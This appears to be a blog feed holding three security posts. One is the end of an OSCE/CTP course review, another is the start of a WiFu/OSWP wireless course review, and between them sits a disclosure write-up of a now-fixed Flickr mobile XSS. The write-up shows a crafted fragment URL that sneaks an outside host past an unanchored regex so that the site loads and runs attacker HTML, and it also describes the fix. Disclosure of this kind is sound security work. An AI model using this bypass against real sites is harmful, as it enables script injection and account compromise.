&lt;p&gt;What made it worst was, watching other students who were doing the course at the same time, getting a shell on their first attempt! Having checked the Offsec forum, it was clear that it wasn't just me who was having issues with this task. After reading up on the forum for a few hints, I made a Skype call to a friend (who had already passed the course) with whom I could bounce around ideas. After what felt like a few hundred failed attempts, I discovered my mistake &lt;em&gt;(I'm so glad that person didn't record me doing my "victory cheer/scream").&lt;/em&gt; Due to the non-disclosure agreement I am unable to reveal what I was doing wrong. Needless to say I'm never going to forget it. Looking back at it now, it was so obvious – but not at the time! It's a classic case of "it's easy once you know how".&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The last section is a "Wide Area Network (WAN)" attack. The biggest WAN is the Internet, which makes the power of this attack, very scary.&lt;/p&gt;

&lt;p&gt;It does require a few things to be "aligned" for it to work, however, I'm sure in "real world scenarios", with some information gathering and poor configurations it can quite easily happen.&lt;/p&gt;

&lt;p&gt;There is only one module for this section, so it would have been beneficial to have a bit more padding to the course material. For example, another module or even some "boring" methods (namely, brute forcing) would have enabled me to gain some of the credentials that are required. Brute forcing sadly happens more often than it should, and as a result various companies have had their perimeters breached.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;There isn't a "lab" as such, which there was with PWB. There you had multiple networks with pre-populated targets (50 ). This time, you have the course material software pre-installed &amp;amp; configured – ready to be exploited. To help make up for the practice targets, you will need to grab them yourself. This is quite easy and there isn't a shortage of things to-do (see resources at the bottom).&lt;/p&gt;

&lt;a name="Exam"&gt;&lt;/a&gt;
&lt;h4&gt;Exam&lt;/h4&gt;

&lt;p&gt;Unlike PWB, I waited a good while after finishing the course, before taking the exam (three weeks as opposed to two days!). I didn't find the course as taxing &amp;amp; tiring as PWB, however, the CTP exam is double in length (nonstop 48 hours) so I wanted to be well rested before attempting it.&lt;/p&gt;

&lt;p&gt;During this time, I went back over the course material again and produced templates of the exploits. The ideas being that these would be "ready to use" for whatever the exam would have in store. With the remainder of the time, up until the exam, I kept on going with the pre-course material that I hadn't completed.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I really enjoyed this exam (something I didn't think I would ever say about doing one!). I liked it much more than the PWB's exam and in an odd way, more than the course itself. I felt satisfied after completing each exam task, somehow it just felt rewarding and that I really did accomplished what Offsec course set out to teach.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;48 hours non-stop might seem like a long time for an exam (which it is) and it was hard to find the time to take the exam, however if it was another 24-hour exam I would have failed.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I'm unable to go into details of what's in the exam for obvious reasons. But like PWB's exam, there are multiple machines that have different point values and you require a certain amount to pass. It's also structured in such a way that it forces you to-do certain tasks. However, the style of the tasks are not the same as PWB.&lt;/p&gt;

&lt;p&gt;You're only tested on what's in the &lt;a href="http://www.offensive-security.com/documentation/cracking-the-perimiter-syllabus.pdf"&gt;course syllabus&lt;/a&gt;; there isn't anything out of scope, but there are a couple of Offsec curve balls (so watch out)! If you apply the methods and techniques that you learnt, you'll be able to overcome these surprises and pass the exam.&lt;/p&gt;

&lt;p&gt;I personally found it easier to do something for a part of the exam that wasn't covered in the course material. This made my way of completing that task much more complicated than it needed to be, but in my eyes my way was more straightforward &lt;em&gt;(I'm putting it down to the lack of sleep)&lt;/em&gt;. I compared notes with other students via the forum (on a private area, which opens up after passing the exam) and discovered that there was an alternative solution to my complex one, which is covered &amp;amp; taught in the course material.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;All the tasks required for the exam are pretty straight forward, you know what to do and can see what you need to do to achieve them, its just a question of being able to do so!&lt;/p&gt;

&lt;p&gt;I personally found the higher point tasks (the ones which are seen as "harder" so you need to spend more time on them) much easier than the lower point ones (and these are meant to be simpler)!&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I managed to get one of the harder tasks within a matter of hours – which boosted my confidence. However, I then went onto one of the easier ones for which I spent the next 20 odd hours banging my head. The fact it was seen as "easy" was stressing me out even more, which didn't help.&lt;/p&gt;

&lt;p&gt;At some stage, I took five hours out to sleep. However before the sun was up, I was at it again. The second night, I didn't try to sleep at all, just powered through it and kept on doing so for the rest of the day. It paid off, because by dawn I had enough points to pass!&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Throughout the exam, I gave (and some times forced) myself breaks away from the screen both every few hours and between each task.
When I was at the keyboard, I found myself regularly snacking (fruit &amp;amp; nuts – healthy eating and whatnot), and listening to music (big thank you &lt;a href="http://di.fm/"&gt;Di.FM&lt;/a&gt;!). I didn't get distracted with anything else other than the exam (e.g. no emails, IM and social networks etc). Upon getting stuck, feeling a bit down or informing people of my progress - I would flick to IRC &amp;amp; Skype. Having a couple of people passing on words of encouragement does wonders (big thanks guys). I did bounce a few ideas off people who had already gone through the exam as I found it useful to explain my thoughts out loud to something other than a screen. They didn't say anything other than laughing at me after witnessing my victory dance.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;After the time was up and I got kicked off the exam VPN, I had somehow managed to collect enough points to pass – however, it wasn't over just yet, as I still had to complete the exam report. This is the same procedure as PWB and you still have the same amount of time (24 hours) in which to submit it to Offsec.&lt;/p&gt;

&lt;p&gt;Using the template from PWB, I did a summary page with step-by-step screenshot instructions (thank you &lt;a href="http://evernote.com/"&gt;Evernote&lt;/a&gt;!) for each task. At the end, I put in some proof that I had actually completed the course material too, as Offsec always suggest putting as much information as possible in your reports for any of their courses.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;After submitting the report, it was just a case of waiting three business days to hear the final outcome. On the second day I found a new email from Offsec congratulating me on passing!&lt;/p&gt;

&lt;p&gt;&lt;img class="center" src="https://blog.g0tmi1k.com/images/offsec-osce.png" title="Offec OSCE" /&gt;&lt;/p&gt;

&lt;a name="Summary"&gt;&lt;/a&gt;
&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;Overall it's hard to compare CTP directly to the PWB course; this is mainly due to PWB being Offsec's "flag ship" course. This is their most well known course and as a result it's had the most time spent on it, so it's been updated more, which has lead to it receiving lots of little interesting improvements. As a result, the high quality of the PWB course has spoiled all the others (not just Offsec courses)!&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Not directly comparing it to anything else, it is another quality course from Offsec. The course is well laid out and it's made up of good quality material. It would benefit from having a bit of extra attention along with some of the tricks that they have learnt from developing their other courses. However, I still have learnt a vast amount from taking the course.&lt;/p&gt;

&lt;p&gt;Offsec has taken the time to create original material, put it all together in one place and dressed it up nicely with a bow on top. There is also support, both technical, from admins and, social from other students. The cherry on top is you also get a qualification that is recognized worldwide.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The CTP course is more difficult and has more specialized fields than PWB. As a result, it's for people who are really confident in their career path or who are really enthusiastic about self improvement. A lot of people who take PWB are involved in information security as a hobby or are new to the field and want to try their hand at it, whereas CTP is for people who are sure they want to take the next step – which is reflected in the course fees. PWB is more realistic for people who are funding themselves &lt;em&gt;(which is what I did)&lt;/em&gt;, whereas I was lucky enough for my employer to cover the cost of CTP.&lt;/p&gt;

&lt;p&gt;If you're weak in all four areas mentioned above, or generally not confident, then you might be better getting the 60-day option of the course. Otherwise, I would recommend getting 30 days of lab time (and then extend it if required).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Offsec doesn't teach you how to pass an exam, or give you step-by-step for how to-do xyz, instead they show you how to THINK and do things yourself. This teaching style can frustrate some students from time to time. Please be clear about this before embarking on the course. Do not expect to have clear, handholding instructions given to you on a sliver platter.&lt;/p&gt;

&lt;a name="Advice"&gt;&lt;/a&gt;
&lt;h2&gt;Advice&lt;/h2&gt;

&lt;a name="To.anyone.thinking.about.doing.the.course"&gt;&lt;/a&gt;
&lt;h3&gt;To anyone thinking about doing the course&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;If you cheated at fc4.me - this definitely isn't the course for you.&lt;/li&gt;
&lt;li&gt;If you have been dropping 0days left, right and center – this probably isn't the course for you.&lt;/li&gt;
&lt;li&gt;If you don't understand the view of any debugger or have NEVER done a thing with assembly (ASM) – this course might not be for you (just yet!).&lt;/li&gt;
&lt;li&gt;If you haven't done PWB before doing this course - it depends on your own experience and background knowledge (only you can answer that), however I would recommend starting with PWB.&lt;/li&gt;
&lt;li&gt;If you're not able to learn by yourself – none of Offsec's courses are for you.&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="To.students.currently.doing.the.course"&gt;&lt;/a&gt;
&lt;h3&gt;To students currently doing the course&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Use the forums &amp;amp; the IRC channel – You'll find hints and other students who are in the same boat as you. It's a great resource and place to bounce ideas around.&lt;/li&gt;
&lt;li&gt;Find different methods/tools to do the same thing – it helps to re-enforce &amp;amp; prepares you more for the exam.&lt;/li&gt;
&lt;li&gt;Do the extra miles – and also some of your own extra homework (for examples, you can see what extra resources I used at the end)&lt;/li&gt;
&lt;li&gt;If you're stuck – try harder! The frustration and pain is what makes it that much more rewarding at the end!&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="To.students.about.to.do.the.exam..or.currently.doing.it.."&gt;&lt;/a&gt;
&lt;h3&gt;To students about to do the exam (or currently doing it!)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Look at ALL the tasks that are in the exam – even if you believe you're going to fail. Set some time aside and try them all out (you'll do better than you think).&lt;/li&gt;
&lt;li&gt;Don't spend all your time on certain task(s) – it's easy to get hung up on doing just that one thing. See the comment from before about time management.&lt;/li&gt;
&lt;li&gt;Take regular breaks – even if you feel like you don't need one. They'll help more than you think. Your brain could thank you by providing you the answer!&lt;/li&gt;
&lt;li&gt;Get some sleep both before the exam and during it – its 48 hours, after being awake for a certain amount of time, your brain will start to degrade in performance (regardless how much caffeine you consume).&lt;/li&gt;
&lt;li&gt;If you need some background noise, listen to whatever music you like (I highly recommend &lt;a href="http://di.fm/liquiddnb"&gt;di.fm/liquiddnb&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;


&lt;a name="Resources"&gt;&lt;/a&gt;
&lt;h2&gt;Resources&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Exploit Development (Tutorials)

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.corelan.be/index.php/articles/"&gt;https://www.corelan.be/index.php/articles/&lt;/a&gt;   &lt;strong&gt;*Highly Recommend*&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://fuzzysecurity.com/tutorials.html"&gt;http://fuzzysecurity.com/tutorials.html&lt;/a&gt;   &lt;strong&gt;*Highly Recommend*&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploit Development (Vulnerable Code)

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://exploit-exercises.com/protostar"&gt;http://exploit-exercises.com/protostar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://exploit-exercises.com/fusion"&gt;http://exploit-exercises.com/fusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Exploit Development (Misc)

&lt;ul&gt;
&lt;li&gt;sickn3ss ~ &lt;a href="http://ihazomgsecurityskillz.blogspot.com/"&gt;http://ihazomgsecurityskillz.blogspot.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;OpenSecurity ~ &lt;a href="http://opensecuritytraining.info/Training.html"&gt;http://opensecuritytraining.info/Training.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Books

&lt;ul&gt;
&lt;li&gt;The Shellcoder's Handbook [ISBN-13: 978-0-76454-468-2] ~ &lt;a href="http://www.amazon.com/The-Shellcoders-Handbook-Discovering-Exploiting/dp/0764544683"&gt;http://www.amazon.com/The-Shellcoders-Handbook-Discovering-Exploiting/dp/0764544683&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Bug Hunter's Diary [ISBN-13: 978-1-59327-385-9] ~ &lt;a href="http://nostarch.com/bughunter"&gt;http://nostarch.com/bughunter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The Art of Exploitation (2nd Edition) [ISBN-13: 978-1-59327-144-2] ~ &lt;a href="http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441"&gt;http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The Web Application Hacker's Handbook (2nd Edition) [ISBN-13: 978-1-11802-647-2] ~ &lt;a href="http://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470"&gt;http://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Metasploit: The Penetration Tester's Guide [ISBN-13: 978-159-3-27288-3] ~ &lt;a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X"&gt;http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Brute Force Vulnerability Discovery [ISBN-13: 978-032-1-44611-4] ~ &lt;a href="http://www.amazon.com/Fuzzing-Brute-Force-Vulnerability-Discovery/dp/0321446119"&gt;http://www.amazon.com/Fuzzing-Brute-Force-Vulnerability-Discovery/dp/0321446119&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Assembly Language Step-by-Step: Programming with Linux [ISBN-13: 978-047-04-9702-9] ~ &lt;a href="http://www.amazon.com/Assembly-Language-Step-Step-Programming/dp/0470497025"&gt;http://www.amazon.com/Assembly-Language-Step-Step-Programming/dp/0470497025&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning OllyDBG

&lt;ul&gt;
&lt;li&gt;Lena's Reversing for Newbies ~ &lt;a href="http://tuts4you.com/download.php?list.17"&gt;http://tuts4you.com/download.php?list.17&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;OllyDbg Tutorials ~ &lt;a href="http://tuts4you.com/download.php?list.29"&gt;http://tuts4you.com/download.php?list.29&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;OllyDbg Plugins ~ &lt;a href="http://tuts4you.com/download.php?list.3"&gt;http://tuts4you.com/download.php?list.3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;OpenRCE ~ &lt;a href="http://www.openrce.org/downloads/"&gt;http://www.openrce.org/downloads/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning GDB

&lt;ul&gt;
&lt;li&gt;SecurityTube's SLAE (SecurityTube Linux Assembly Expert) course ~ &lt;a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html"&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning IDA Pro

&lt;ul&gt;
&lt;li&gt;IDA Pro Disassembler &amp;amp; Debugger ~ &lt;a href="http://tuts4you.com/download.php?list.67"&gt;http://tuts4you.com/download.php?list.67&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Free IDA Pro Binary Auditing Training Material for University Lectures ~ &lt;a href="http://www.binary-auditing.com/"&gt;http://www.binary-auditing.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><pubDate>Fri, 16 Aug 2013 19:18:00 +0000</pubDate></item><item><title>Abusing CORS for an XSS on Flickr</title><link>https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/</link><description>&lt;p&gt;I recently found an XSS on the mobile version of Flickr (&lt;a href="http://m.flickr.com"&gt;http://m.flickr.com&lt;/a&gt;). Due to the way the bug is triggered, I thought it deserved a write-up.&lt;/p&gt;

&lt;p&gt;Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that &lt;code&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Manipulating_the_browser_history#The_pushState().C2.A0method"&gt;pushState&lt;/a&gt;&lt;/code&gt; is available).&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-1.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-1.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;When the page is loaded, a function, &lt;code&gt;q()&lt;/code&gt; (seen below), is called which will check the value of &lt;code&gt;location.hash&lt;/code&gt;, and call &lt;code&gt;F.iphone.showSelectedPage()&lt;/code&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-2.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-2.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, &lt;code&gt;F.iphone.showPageByHref()&lt;/code&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-3.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-3.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from &lt;code&gt;m.flickr.com&lt;/code&gt;. If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with &lt;code&gt;&lt;a href="http://m.flickr.com"&gt;http://m.flickr.com&lt;/a&gt;&lt;/code&gt;. Pretty solid check, right?&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-4.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-4.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains &lt;code&gt;m.flickr.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can get our own external page loaded by passing in a URL like so:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;//fin1te.net/flickr.php?bypass=m.flickr.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX.&lt;/p&gt;

&lt;p&gt;Since we now have &lt;a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing"&gt;CORS&lt;/a&gt; in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-5.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-5.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;All we need to do is specify a couple of headers (the additional options in the &lt;code&gt;Access-Control-Allow-Headers&lt;/code&gt; are to prevent syntax errors in the Javascript), along with our payload.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-6.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-6.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;The next part of the Javascript dumps the response into an element with &lt;code&gt;innerHTML&lt;/code&gt;.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-7.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-7.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;p&gt;Which leads to our payload being executed.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-8.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-8.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;

&lt;h3 id="fix"&gt;Fix&lt;/h3&gt;

&lt;p&gt;This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash.&lt;/p&gt;

&lt;figure style="text-align: center;"&gt;
    &lt;a class="image-popup" href="https://whitton.io/images/flickrcors/flickr-cors-9.png"&gt;
        &lt;img src="https://whitton.io/images/flickrcors/flickr-cors-9.png" /&gt;
    &lt;/a&gt;
&lt;/figure&gt;


    &lt;p&gt;&lt;a href="https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/"&gt;Abusing CORS for an XSS on Flickr&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on December 12, 2013.&lt;/p&gt;</description><pubDate>Thu, 12 Dec 2013 00:00:00 +0000</pubDate></item><item><title>Offensive Security Wireless Attacks (WiFu) + Offensive Security Wireless (OSWP)</title><link>https://blog.g0tmi1k.com/2014/01/offensive-security-wireless/</link><description>&lt;p&gt;&lt;em&gt;The views and opinions expressed on this site are those of the author. Any claim, statistic, quote or other representation about a product or service should be verified with the seller, manufacturer or provider.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A few months back, I took &lt;a href="https://www.offensive-security.com/"&gt;Offensive Security&lt;/a&gt;'s online course &lt;a href="https://www.offensive-security.com/information-security-training/offensive-security-wireless-attacks/"&gt;WiFu&lt;/a&gt; course &amp;amp; exam &lt;a href="https://www.offensive-security.com/information-security-certifications/oswp-offensive-security-wireless-professional/"&gt;OSWP&lt;/a&gt;, as I had written up a review for &lt;a href="https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/"&gt;PWB/OSCP&lt;/a&gt; &amp;amp; &lt;a href="https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/"&gt;CTP/OSCE&lt;/a&gt;, I thought I would do this too. As always, everything in this post is both personal comments and my own experience with the course.&lt;/p&gt;

&lt;p&gt;&lt;img alt="Offsec WiFu Box" class="center" height="304" src="https://blog.g0tmi1k.com/images/offsec-wifu-boxes-medium.png" title="Offec WiFu" width="235" /&gt;&lt;/p&gt;

&lt;!--more--&gt;




&lt;div id="tocBlock"&gt;
&lt;span class="tocHeading"&gt;Table of Contents&lt;/span&gt;
&lt;ul&gt;
 &lt;li&gt;
 &lt;ul&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Course.Material"&gt;Course Material&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Course.Materials..amp..Lab.Exam.Setup"&gt;Course Materials &amp;amp; Lab/Exam Setup&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Material.Breakdown..WiFu."&gt;Material Breakdown (WiFu)&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Exam..OSWP."&gt;Exam (OSWP)&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Reflection"&gt;Reflection&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Myths"&gt;Myths&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#WPS"&gt;WPS&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Criticism"&gt;Criticism&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Is.this.course.for.me."&gt;Is this course for me?&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#So.why.do.this.course..What.s.the.point.in.doing.this..I.know.how.to.crack.hack.WPA."&gt;So why do this course? What's the point in doing this, I know how to crack/hack WPA.&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#What.s.wrong.with.the.resources.that.are.out.there.currently."&gt;What's wrong with the resources that are out there currently?&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;
  &lt;ul&gt;
   &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Advice"&gt;Advice&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
  &lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;p&gt;It's not easy to create a course, especially with the amount of resources that are freely available, such as the &lt;a href="http://www.aircrack-ng.org/doku.php"&gt;aircrack-ng wiki&lt;/a&gt; and &lt;a href="http://www.securitytube.net/groups?operation=view&amp;amp;groupId=9"&gt;Security Tube's Wireless Megaprimer&lt;/a&gt;. Both are good, if not great sources of knowledge that make them a valued resource, however, there is still room for WiFu - more on this later.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Before doing the course, I had already dabbled with 802.11 and its security, successfully cracking some WEP &amp;amp; WPA networks, and writing my own "wrapper" to automate the process. However, I still learnt more than a thing or two by the time I had completed the course.&lt;/p&gt;

&lt;p&gt;Everything that I knew before the course, was self taught, which came from reading blog/forum postings, and the odd video (There are plenty of resources – and they range in quality, depth of detail and age).&lt;/p&gt;

&lt;p&gt;Yes, I was able to learn, and teach myself for free. But, I spent time doing it, as I had to go out searching for it (which made it easier to skip over certain areas, if you didn't seek them out). There are also conflicting bits of information online (either because it's out-dated or it's "the blind leading the blind").&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;As always, with an Offsec course, all the information that you need is in one place. They have done their homework including getting the author (Mister_X) of _THE_ pentesting tool for 802.11, aircrack-ng, to help write the course.&lt;/p&gt;

&lt;a name="Course.Material"&gt;&lt;/a&gt;
&lt;h2&gt;Course Material&lt;/h2&gt;

&lt;a name="Course.Materials..amp..Lab.Exam.Setup"&gt;&lt;/a&gt;
&lt;h3&gt;Course Materials &amp;amp; Lab/Exam Setup&lt;/h3&gt;

&lt;p&gt;The course material is made up of a handbook/document (.PDF – 385 pages), and videos (.SWF – little under 3 and a half hours). In the handbook, there are links to external example .CAP files that Offsec is hosting, allowing you to follow alongside. There is also a custom Backtrack ISO file, which is what the course recommends you use.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I personally was able to progress through the entire course material in a weekend. The exercises were straight forward, and I didn't run into any issues completing them (I used an old NetGear WG614 v9 &amp;amp; TP-Link WR104ND for access points and &lt;a href="https://forums.kali.org/showthread.php?3816-Working-Hardware-ALFA-AWUS036H-500mW-(Realtek-RTL8187L-rtl8187"&gt;ALFA AWUS036H&lt;/a&gt; &amp;amp; &lt;a href="https://forums.kali.org/showthread.php?3820-Working-Hardware-Linksys-WUSB54GC-v1-(Ralink-2573-USB-rt73usb"&gt;Linksys WUSB54GC&lt;/a&gt; wireless cards).&lt;/p&gt;

&lt;p&gt;Unlike PWB/CTP, there isn't a remote lab this time to connect into – you will be re-creating the labs locally. They isn't any "step by step" instructions showing you how to alter the router configurations (you sometimes see a glimpse of this in the videos), as each router's UI is different. Instead they just inform you what settings you need to place your router in for this exercise.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The upside to not having any remote labs, is that you are not limited to lab time, so you are able to work on it freely. However, the exam attempt that comes with the course is only valid for 120 days after you receive the course materials – which is plenty of time to get you prepared.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The exam however, is taken remotely. You do not VPN in (like OSCP/OSCE - which allows you to use your own hardware and software configuration), instead you SSH to a clean, ready to go, Backtrack 5 r3 machine which has &lt;em&gt;everything&lt;/em&gt; you need to be able to pass the exam.&lt;/p&gt;

&lt;a name="Material.Breakdown..WiFu."&gt;&lt;/a&gt;
&lt;h3&gt;Material Breakdown (WiFu)&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;If you want to follow along yourself, you can find the &lt;a href="http://www.offensive-security.com/documentation/wifu-syllabus.pdf"&gt;course syllabus here&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It begins with all with all the standards &amp;amp; protocols for 802.11 (with a bit of a history lesson), which moves into how a wireless networks work, the different types of WiFi.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Then it is chapter 3. This gives a full breakdown of 802.11 packets, as well as techniques used in the protocol, and it goes into a great amount of depth. Throughout this section, on nearly every page there is a screenshot, table, or diagram to help break up the text, and help explain the area in more depth.&lt;/p&gt;

&lt;p&gt;I personally see it as a bit of a "dry" area, and the authors felt the same (there are words of encouragement to stick with it and understand everything that is being said here).&lt;/p&gt;

&lt;p&gt;This is a large section (over 100 pages), as they have to cover too much in this area. This builds up a good proportion of background knowledge, showing why everything works.&lt;/p&gt;

&lt;p&gt;Reading back on my notes for this chapter, the amount taken towards the ends does start to thin out (however I have now got the PDF to use as reference to fall back on).&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;After learning all that theory behind it, it starts to get ready for the practical. They do this by showing how to pick hardware &lt;em&gt;(note: I see this question being ask almost on a daily basis – it's a popular question!)&lt;/em&gt;. Rather than just saying "get this card", they explain what to look for in a card – and which one would be best suited for the job &lt;em&gt;(spoiler alert: there isn't a single card that "is the best and does everything")&lt;/em&gt;.&lt;/p&gt;

